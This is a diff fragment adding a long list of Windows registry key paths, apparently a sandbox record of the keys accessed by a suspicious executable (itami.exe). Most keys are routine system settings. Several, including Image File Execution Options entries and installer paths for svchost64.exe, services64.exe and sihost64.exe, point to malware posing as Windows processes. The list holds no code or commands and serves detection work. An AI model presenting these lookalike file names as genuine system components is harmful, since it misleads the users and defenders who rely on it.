+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Runtime.Caching__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Runtime.Caching__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.EnterpriseServices__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.EnterpriseServices__b03f5f7f11d50a3a",
+    "HKLM\\SOFTWARE\\Microsoft\\BidInterface\\Loader",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Data.SqlXml__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Data.SqlXml__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.10.0.Microsoft.JScript__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.10.0.Microsoft.JScript__b03f5f7f11d50a3a",
+    "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Environment",
+    "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Environment\\PSMODULEPATH",
+    "HKCU\\Environment",
+    "HKCU\\Environment\\PSMODULEPATH",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.3.0.Microsoft.PowerShell.Security__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.3.0.Microsoft.PowerShell.Security__31bf3856ad364e35",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\PowerShell",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\HardwareEvents",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\HardwareEvents\\PowerShell",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Internet Explorer",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Internet Explorer\\PowerShell",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Key Management Service",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Key Management Service\\PowerShell",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Media Center",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Media Center\\PowerShell",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security\\PowerShell",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\System",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\System\\PowerShell",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Windows PowerShell",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Windows PowerShell\\PowerShell",
+    "HKCU\\Control Panel\\International",
+    "HKCU\\Control Panel\\International\\sYearMonth",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Dynamic__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Dynamic__b03f5f7f11d50a3a",
+    "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Environment\\__PSLockdownPolicy",
+    "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds",
+    "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\PipelineMaxStackSizeMB",
+    "HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.6.1.Microsoft.Security.ApplicationId.PolicyManagement.Cmdlets__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.6.1.Microsoft.Security.ApplicationId.PolicyManagement.Cmdlets__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.1.0.System.Management.Automation__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.1.0.System.Management.Automation__31bf3856ad364e35\\4",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.1.0.System.Management.Automation__31bf3856ad364e35\\1",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.1.0.System.Management.Automation__31bf3856ad364e35\\1\\1.0.0.0",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.1.0.System.Management.Automation__31bf3856ad364e35\\1\\1.0.0.0\\ConfigFilePath",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.1.0.System.Management.Automation__31bf3856ad364e35\\1\\1.0.0.0\\12",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.1.0.System.Management.Automation__31bf3856ad364e35\\1\\1.0.0.0\\12\\ConfigFilePath",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.1.0.System.Management.Automation__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.6.1.Microsoft.Security.ApplicationId.PolicyManagement.PolicyManager__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.6.1.Microsoft.Security.ApplicationId.PolicyManagement.PolicyManager__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.6.1.Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.6.1.Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.6.1.Microsoft.Security.ApplicationId.PolicyManagement.PolicyEngineApi.Interop__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.6.1.Microsoft.Security.ApplicationId.PolicyManagement.PolicyEngineApi.Interop__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.6.1.Microsoft.Security.ApplicationId.PolicyManagement.XmlHelper__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.6.1.Microsoft.Security.ApplicationId.PolicyManagement.XmlHelper__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.3.0.Microsoft.PowerShell.Commands.Management__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.3.0.Microsoft.PowerShell.Commands.Management__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.ServiceProcess__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.ServiceProcess__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Windows.Forms__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Windows.Forms__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.3.0.Microsoft.WSMan.Management__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.3.0.Microsoft.WSMan.Management__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Drawing__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Drawing__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.Web.Services__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.Web.Services__b03f5f7f11d50a3a",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.1.0.Microsoft.BackgroundIntelligentTransfer.Management__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.1.0.Microsoft.BackgroundIntelligentTransfer.Management__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.6.1.Microsoft.BackgroundIntelligentTransfer.Management.Interop__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.6.1.Microsoft.BackgroundIntelligentTransfer.Management.Interop__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.3.0.Microsoft.PowerShell.LocalAccounts__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.3.0.Microsoft.PowerShell.LocalAccounts__31bf3856ad364e35",
+    "HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Main\\FeatureControl",
+    "HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_IGNORE_POLICIES_ZONEMAP_IF_ESC_ENABLED_KB918915",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_ZONES_CHECK_ZONEMAP_POLICY_KB941001",
+    "HKLM\\Software\\Policies",
+    "HKCU\\Software",
+    "HKLM\\Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
+    "HKLM\\Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Main",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\FrameTabWindow",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\FrameMerging",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\SessionMerging",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\AdminTabProcs",
+    "HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Main",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\TabProcGrowth",
+    "HKLM\\Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\CreateUriCacheSize",
+    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
+    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\CreateUriCacheSize",
+    "HKLM\\Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\EnablePunycode",
+    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\EnablePunycode",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_ALLOW_REVERSE_SOLIDUS_IN_USERINFO_KB932562",
+    "HKLM\\Software\\Policies\\Microsoft\\Internet Explorer",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Security",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Security\\DisableSecuritySettingsCheck",
+    "HKLM\\System\\Setup",
+    "HKLM\\System\\Setup\\SystemSetupInProgress",
+    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",
+    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0",
+    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1",
+    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2",
+    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3",
+    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\4",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_LOCALMACHINE_LOCKDOWN",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_ZONES_DEFAULT_DRIVE_INTRANET_KB941000",
+    "HKLM\\Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\SpecialFoldersCacheSize",
+    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\SpecialFoldersCacheSize",
+    "HKLM\\System\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.6.1.Microsoft.Windows.Diagnosis.TroubleshootingPack__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.6.1.Microsoft.Windows.Diagnosis.TroubleshootingPack__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.6.1.Microsoft.Windows.Diagnosis.SDEngine__31bf3856ad364e35",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.6.1.Microsoft.Windows.Diagnosis.SDEngine__31bf3856ad364e35",
+    "HKCR\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InprocServer32",
+    "HKCR\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InprocServer32\\0x0",
+    "HKLM\\SOFTWARE\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InprocServer32",
+    "HKLM\\SOFTWARE\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InprocServer32\\0x0",
+    "HKCR\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\Server",
+    "HKCR\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\Server\\0x0",
+    "HKLM\\SOFTWARE\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\Server",
+    "HKLM\\SOFTWARE\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\Server\\0x0",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.1.0.Microsoft.Management.Infrastructure__31bf3856ad364e35\\Policy\\Standards",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\Managed\\S-1-5-21-3711686801-687107597-1149503783-1001\\Installer\\Assemblies\\C:|Users|admin|Downloads|itami.exe",
+    "HKCU\\Software\\Microsoft\\Installer\\Assemblies\\C:|Users|admin|Downloads|itami.exe",
+    "HKLM\\SOFTWARE\\Classes\\Installer\\Assemblies\\C:|Users|admin|Downloads|itami.exe",
+    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\KindMap",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_INITIALIZE_URLACTION_SHELLEXECUTE_TO_ALLOW_KB936610",
+    "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_PROTOCOL_LOCKDOWN",
+    "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost64.exe",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\v4.0_policy.4.0.System.IO.Compression__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Fusion\\PublisherPolicy\\Default\\policy.4.0.System.IO.Compression__b77a5c561934e089",
+    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\PropertySystem\\PropertyHandlers\\.exe",
+    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\PropertySystem\\PropertyHandlers\\.exe\\0x0",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Windows PowerShell\\Microsoft\\Internet Explorer\\Security",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Windows PowerShell\\Microsoft\\Internet Explorer\\Security\\DisableSecuritySettingsCheck",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Windows PowerShell\\PowerShell\\Microsoft\\Internet Explorer\\Security",
+    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Windows PowerShell\\PowerShell\\Microsoft\\Internet Explorer\\Security\\DisableSecuritySettingsCheck",
+    "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\services64.exe",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\Managed\\S-1-5-21-3711686801-687107597-1149503783-1001\\Installer\\Assemblies\\C:|Windows|system32|services64.exe",
+    "HKCU\\Software\\Microsoft\\Installer\\Assemblies\\C:|Windows|system32|services64.exe",
+    "HKLM\\SOFTWARE\\Classes\\Installer\\Assemblies\\C:|Windows|system32|services64.exe",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\Managed\\S-1-5-21-3711686801-687107597-1149503783-1001\\Installer\\Assemblies\\C:|Users|admin|AppData|Local|Temp|svchost64.exe",
+    "HKCU\\Software\\Microsoft\\Installer\\Assemblies\\C:|Users|admin|AppData|Local|Temp|svchost64.exe",
+    "HKLM\\SOFTWARE\\Classes\\Installer\\Assemblies\\C:|Users|admin|AppData|Local|Temp|svchost64.exe",
+    "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion",
+    "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\InstallationType",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\HWRPortReuseOnSocketBind",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\System.Net.ServicePointManager.UseHttpPipeliningAndBufferPooling",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\UseHttpPipeliningAndBufferPooling",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\System.Net.ServicePointManager.UseSafeSynchronousClose",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\UseSafeSynchronousClose",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\System.Net.ServicePointManager.UseStrictRfcInterimResponseHandling",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\UseStrictRfcInterimResponseHandling",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\System.Uri.AllowDangerousUnicodeDecompositions",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\AllowDangerousUnicodeDecompositions",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\System.Uri.UseStrictIPv6AddressParsing",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\UseStrictIPv6AddressParsing",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\System.Uri.AllowAllUriEncodingExpansion",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\AllowAllUriEncodingExpansion",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\SchUseStrongCrypto",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\System.Net.ServicePointManager.SchSendAuxRecord",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\SchSendAuxRecord",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\SystemDefaultTlsVersions",
+    "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sihost64.exe",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\System.Net.ServicePointManager.RequireCertificateEKUs",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\RequireCertificateEKUs",
+    "HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\WMIDisableCOMSecurity",
+    "HKCR\\CLSID\\{CF4CC405-E2C5-4DDD-B3CE-5E7582D8C9FA}\\InprocServer32",
+    "HKCR\\CLSID\\{CF4CC405-E2C5-4DDD-B3CE-5E7582D8C9FA}\\InprocServer32\\0x0",
+    "HKLM\\SOFTWARE\\Classes\\CLSID\\{CF4CC405-E2C5-4DDD-B3CE-5E7582D8C9FA}\\InprocServer32",
+    "HKLM\\SOFTWARE\\Classes\\CLSID\\{CF4CC405-E2C5-4DDD-B3CE-5E7582D8C9FA}\\InprocServer32\\0x0",
+    "HKCR\\CLSID\\{4590F811-1D3A-11D0-891F-00AA004B2E24}\\InprocServer32",
+    "HKCR\\CLSID\\{4590F811-1D3A-11D0-891F-00AA004B2E24}\\InprocServer32\\0x0",
+    "HKLM\\SOFTWARE\\Classes\\CLSID\\{4590F811-1D3A-11D0-891F-00AA004B2E24}\\InprocServer32",
+    "HKLM\\SOFTWARE\\Classes\\CLSID\\{4590F811-1D3A-11D0-891F-00AA004B2E24}\\InprocServer32\\0x0",
+    "HKLM\\Software\\Microsoft\\WBEM\\CIMOM",
+    "HKLM\\Software\\Microsoft\\WBEM\\CIMOM\\ProcessID",
+    "HKLM\\Software\\Microsoft\\WBEM\\CIMOM\\EnablePrivateObjectHeap",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\.NETFramework",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Fusion",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Installer\\Assemblies\\C:|Users|user|Desktop|itami.exe",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Installer\\Assemblies\\C:|Windows|system32|services64.exe",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Installer\\Assemblies\\Global",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_ALLOW_REVERSE_SOLIDUS_IN_USERINFO_KB932562",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Security",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\CA",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\CA\\CRLs",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\CA\\CTLs",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\CA\\Certificates",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\Disallowed",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\Disallowed\\CRLs",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\Disallowed\\CTLs",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\Disallowed\\Certificates",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\Root",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\Root\\CRLs",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\Root\\CTLs",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\Root\\Certificates",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\SmartCardRoot",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\SmartCardRoot\\CRLs",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\SmartCardRoot\\CTLs",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\SmartCardRoot\\Certificates",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\TrustedPeople",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\TrustedPeople\\CRLs",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\TrustedPeople\\CTLs",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\TrustedPeople\\Certificates",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\trust",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\trust\\CRLs",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\trust\\CTLs",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\trust\\Certificates",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{031E4825-7B94-4DC3-B131-E946B44C8DD5}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{04731B67-D933-450A-90E6-4ACD2E9408FE}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{11016101-E366-4D22-BC06-4ADA335C892B}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{208D2C60-3AEA-1069-A2D7-08002B30309D}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{26EE0668-A00A-44D7-9371-BEB064C98683}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{2F6CE85C-F9EE-43CA-90C7-8A9BD53A2467}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{4336A54D-038B-4685-AB02-99BB52D3FB8B}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{450D8FBA-AD25-11D0-98A8-0800361B1103}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{59031A47-3F72-44A7-89C5-5595FE6B30EE}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{5B934B42-522B-4C34-BBFE-37A3EF7B9C90}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{64693913-1C21-4F30-A98F-4E52906D3B56}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{871C5380-42A0-1069-A2EA-08002B30309D}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{89D83576-6BD1-4C86-9454-BEB04E94C819}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{8FD8B88D-30E1-4F25-AC2B-553D3D65F0EA}\\ShellFolder",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{9343812E-1C37-4A49-A12E-4B2D810D956B}\\ShellFolder",
